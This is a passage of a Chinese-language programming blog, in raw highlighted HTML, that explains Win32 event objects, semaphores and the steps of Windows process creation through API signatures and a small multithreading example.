以NULL结尾的字符串\t\t\t\t</span></span></span><br><span class=\"line\"><span class=\"params\">)</span>;\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\"><span class=\"number\">2</span>、事件对象的控制\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">BOOL <span class=\"title function_\">SetEvent</span><span class=\"params\">(HANDLE hEvent)</span>;\t\t\t\t       <span class=\"comment\">//将对象设置为已通知</span></span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\"><span class=\"number\">3</span>、关闭时间对象句柄\t\t\t\t</span><br><span class=\"line\">\t\t\t\t       <span class=\"comment\">//关闭句柄</span></span><br><span class=\"line\">CloseHandle();\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\"><span class=\"number\">4</span>、线程控制实验：只读形式的线程控制\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">HANDLE g_hEvent;\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">HWND hEdit1;\t\t\t\t</span><br><span class=\"line\">HWND hEdit2;\t\t\t\t</span><br><span class=\"line\">HWND hEdit3;\t\t\t\t</span><br><span class=\"line\">HWND hEdit4;\t\t\t\t</span><br><span class=\"line\">HANDLE hThread1;\t\t\t\t</span><br><span class=\"line\">HANDLE hThread2;\t\t\t\t</span><br><span class=\"line\">HANDLE hThread3;\t\t\t\t</span><br><span class=\"line\">HANDLE hThread4;\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadProc1</span><span class=\"params\">(LPVOID lpParameter)</span>\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//创建事件\t\t\t</span></span><br><span class=\"line\">\t<span class=\"comment\">//默认安全属性  手动设置未通知状态(TRUE)  初始状态未通知 没有名字 \t\t\t</span></span><br><span class=\"line\">\tg_hEvent = CreateEvent(<span class=\"literal\">NULL</span>, TRUE, FALSE, <span class=\"literal\">NULL</span>);\t\t\t</span><br><span class=\"line\">\tHANDLE　hThread[<span class=\"number\">3</span>];\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//创建3个线程\t\t\t</span></span><br><span class=\"line\">\thThread[<span class=\"number\">0</span>] = ::CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc2, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);\t\t\t</span><br><span class=\"line\">\thThread[<span class=\"number\">1</span>] = ::CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc3, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);\t\t\t</span><br><span class=\"line\">\thThread[<span class=\"number\">2</span>] = ::CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc4, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//设置文本框的值\t\t\t</span></span><br><span class=\"line\">\tSetWindowText(hEdit1,<span class=\"string\">&quot;1000&quot;</span>);\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//设置事件为已通知\t\t\t</span></span><br><span class=\"line\">\tSetEvent(g_hEvent);\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//等待线程结束 销毁内核对象\t\t\t</span></span><br><span class=\"line\">\tWaitForMultipleObjects(<span class=\"number\">3</span>, hThread, TRUE, INFINITE);  \t\t\t</span><br><span class=\"line\">\tCloseHandle(hThread[<span class=\"number\">0</span>]);  \t\t\t</span><br><span class=\"line\">\tCloseHandle(hThread[<span class=\"number\">1</span>]);\t\t\t</span><br><span class=\"line\">\tCloseHandle(hThread[<span class=\"number\">2</span>]);\t\t\t</span><br><span class=\"line\">\tCloseHandle(g_hEvent);  \t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadProc2</span><span class=\"params\">(LPVOID lpParameter)</span>\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t</span><br><span class=\"line\">\tTCHAR szBuffer[<span class=\"number\">10</span>] = &#123;<span class=\"number\">0</span>&#125;;\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//当事件变成已通知时 \t\t\t</span></span><br><span class=\"line\">\tWaitForSingleObject(g_hEvent, INFINITE);\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//读取内容\t\t\t</span></span><br><span class=\"line\">\tGetWindowText(hEdit1,szBuffer,<span class=\"number\">10</span>);\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\tSetWindowText(hEdit2,szBuffer);\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t</span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadProc3</span><span class=\"params\">(LPVOID lpParameter)</span>\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t</span><br><span class=\"line\">\tTCHAR szBuffer[<span class=\"number\">10</span>] = &#123;<span class=\"number\">0</span>&#125;;\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//当事件变成已通知时 \t\t\t</span></span><br><span class=\"line\">\tWaitForSingleObject(g_hEvent, INFINITE);\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//读取内容\t\t\t</span></span><br><span class=\"line\">\tGetWindowText(hEdit1,szBuffer,<span class=\"number\">10</span>);\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\tSetWindowText(hEdit3,szBuffer);\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t</span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadProc4</span><span class=\"params\">(LPVOID lpParameter)</span>\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t</span><br><span class=\"line\">\tTCHAR szBuffer[<span class=\"number\">10</span>] = &#123;<span class=\"number\">0</span>&#125;;\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//当事件变成已通知时 \t\t\t</span></span><br><span class=\"line\">\tWaitForSingleObject(g_hEvent, INFINITE);\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//读取内容\t\t\t</span></span><br><span class=\"line\">\tGetWindowText(hEdit1,szBuffer,<span class=\"number\">10</span>);\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\tSetWindowText(hEdit4,szBuffer);\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"信号量\"><a class=\"markdownIt-Anchor\" href=\"#信号量\">#</a> 信号量</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HANDLE <span class=\"title function_\">CreateSemaphore</span><span class=\"params\">(\t\t</span></span><br><span class=\"line\"><span class=\"params\">  LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,\t\t</span></span><br><span class=\"line\"><span class=\"params\">  LONG lInitialCount,\t\t</span></span><br><span class=\"line\"><span class=\"params\">  LONG lMaximumCount,\t\t</span></span><br><span class=\"line\"><span class=\"params\">  LPCTSTR lpName\t\t</span></span><br><span class=\"line\"><span class=\"params\">)</span>;\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">函数说明：\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">第一个参数表示安全控制，一般直接传入<span class=\"literal\">NULL</span>。\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">第二个参数表示初始资源数量。<span class=\"number\">0</span>时不发送信号 \t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">第三个参数表示最大并发数量。lInitialCount&lt;=lMaximumCount\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">第四个参数表示信号量的名称，传入<span class=\"literal\">NULL</span>表示匿名信号量。\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">打开信号量\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">HANDLE OpenSemaphore(\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">  DWORD dwDesiredAccess,\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">  BOOL bInheritHandle,\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">  LPCTSTR lpName\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">);\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">函数说明：\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">第一个参数表示访问权限，对一般传入SEMAPHORE_ALL_ACCESS。详细解释可以查看MSDN文档。\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">第二个参数表示信号量句柄继承性，一般传入FALSE即可。\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">第三个参数表示名称，不同进程中的各线程可以通过名称来确保它们访问同一个信号量。\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">递增信号量的当前资源计数\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">BOOL <span class=\"title function_\">ReleaseSemaphore</span><span class=\"params\">(\t\t</span></span><br><span class=\"line\"><span class=\"params\">\t\t</span></span><br><span class=\"line\"><span class=\"params\">  HANDLE hSemaphore,\t\t</span></span><br><span class=\"line\"><span class=\"params\">\t\t</span></span><br><span class=\"line\"><span class=\"params\">  LONG lReleaseCount,  \t\t</span></span><br><span class=\"line\"><span class=\"params\">\t\t</span></span><br><span class=\"line\"><span class=\"params\">  LPLONG lpPreviousCount \t\t</span></span><br><span class=\"line\"><span class=\"params\">\t\t</span></span><br><span class=\"line\"><span class=\"params\">)</span>;\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">函数说明：\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">第一个参数是信号量的句柄。\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">第二个参数表示增加个数，必须大于<span class=\"number\">0</span>且不超过最大资源数量。\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">第三个参数返回当前资源数量的原始值，设为<span class=\"literal\">NULL</span>表示不需要传出。\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">注：没有一个函数可以用来查询信标的当前资源数量的值\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">信号量的清理与销毁\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">CloseHandle()\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"进程\"><a class=\"markdownIt-Anchor\" href=\"#进程\">#</a> 进程</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">一、进程的创建过程：\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">打开系统\t\t\t双击要运行的程序\t\t\tEXE开始执行\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">步骤一：\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">当系统启动后，创建一个进程：Explorer.exe 也就是桌面进程.\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">步骤二：\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">当用户双击某一个EXE时，Explorer 进程使用CreateProcess函数创建被双击的EXE,也就是说，我们在桌面上双\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">击创建的进程都是Explorer进程的子进程.\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">通过XueTr.exe，查看哪些进程是由Explorer创建的.\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">explorer 进程创建完父进程就被终结了。进程必须由别的进程创建出来</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BOOL CreateProcess(\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPCTSTR lpApplicationName,                 // name of executable module\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPTSTR lpCommandLine,                      // command line string\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPSECURITY_ATTRIBUTES lpProcessAttributes, // SD\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPSECURITY_ATTRIBUTES lpThreadAttributes,  // SD\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  BOOL bInheritHandles,                      // handle inheritance option\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  DWORD dwCreationFlags,                     // creation flags\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPVOID lpEnvironment,                      // new environment block\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPCTSTR lpCurrentDirectory,                // current directory name\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPSTARTUPINFO lpStartupInfo,               // startup information\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPPROCESS_INFORMATION lpProcessInformation // process information\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">);\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、创建内核对象\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">用户层\t\t\t\t\t内核层\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">CreateProcess\t\t NtCreateProcess\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t高2G中的一块内存\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t0x10\t0x812356\t0\t\t句柄表，刚创建时是空的\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t如果这个刚刚被创建的进程，里面的线程用创建了其他的内核对象\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t注意：进程是一个空间的概念，而线程才是真正执行的代码\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t比如：\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\tCreateProcess\t\tCreateMutex\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\tCreateThread\t\tCreateFile\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\tCreateEvent\t\tCreateFileMapping\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t...\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t高2G中的一块内存\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t内核对象的句柄表\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t0x0\t0x812345\t0\t\t为了安全，不会给客户端返回\t</span><br><span class=\"line\">\t\t\t\t\t0x1\t0x834567\t1\t\t真正的地址,而是一个编号\t</span><br><span class=\"line\">\t\t\t\t\t0x2\t0x8XXXXX\t0\t\t\t</span><br><span class=\"line\">\t\t\t\t\t0x3\t0x8.....\t1\t\t\t</span><br><span class=\"line\">\t\t\t\t\t0x4\t0x8.....\t1\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2、分配4GB的虚拟空间(Windows 32位)\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">0x00000000 - 0x0000FFFF\t\t\t\t\t\t\tNULL指针使用\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\tint* pnSomeInteger = (int*)malloc(sizeof(int));\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t*pnSomeInteger = 5;\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">0x00010000 - 0x7FFFFFFF\t\t\t\t\t\t\t用户区\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t1、将EXE拉伸，存储到指定的位置\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t1000000\t\t\t\t\t2、遍历EXE导入表，将需要用到的DLL拉伸存储到\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t指定位置，如果位置被占用，换的地方，并通过\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\tDLL的重定位表，修复全局遍历.\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t2000000\t\t\t\t\t3、DLL如果引用了其他的DLL 递归第二步\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t4、修复EXE/DLL中的IAT表\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t5、创建线程、设置线程CONTEXT 开始执行\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">内核：\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">0x80000000 - 0xFFFFFFFF\t\t\t\t\t\t\t\t\t\t\t\t</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3、创建进程的主线程\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">当进程的空间创建完毕，EXE与导入表中的DLL都正确加载完毕后，会创建一个线程\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">当线程得到CPU的时候，程序就正开始指向了，EIP的初始值设定为：ImageBase+OEP\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">HANDLE CreateThread(\t\t\t\t\t\t\t\t</span><br><span class=\"line\">   PSECURITY_ATTRIBUTES psa,\t\t\t\t\t\t\t\t</span><br><span class=\"line\">   DWORD cbStack,\t\t\t\t\t\t\t\t</span><br><span class=\"line\">   PTHREAD_START_ROUTINE pfnStartAddr,\t\t\t\t\t\t\t\t</span><br><span class=\"line\">   PVOID pvParam,\t\t\t\t\t\t\t\t</span><br><span class=\"line\">   DWORD fdwCreate,\t\t\t\t\t\t\t\t</span><br><span class=\"line\">   PDWORD pdwThreadID);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">当进程创建成功后，会将进程句柄、主线程句柄、进程ID以及主线程ID存储在\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">typedef struct _PROCESS_INFORMATION\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">   HANDLE hProcess;\t\t\t\t//进程句柄\t\t\t\t</span><br><span class=\"line\">   HANDLE hThread;\t\t\t\t//主线程句柄\t\t\t\t</span><br><span class=\"line\">   DWORD dwProcessId;\t\t\t\t//进程ID\t\t\t\t</span><br><span class=\"line\">   DWORD dwThreadId;\t\t\t\t//线程ID\t\t\t\t</span><br><span class=\"line\">&#125; PROCESS_INFORMATION;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">也就是，CreateProcess的最后一个 OUT 参数\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">到此，整个进程创建结束了.\t\t\t\t\t\t\t\t</span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n<h4 id=\"createprocess\"><a class=\"markdownIt-Anchor\" href=\"#createprocess\">#</a> CreateProcess</h4>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span 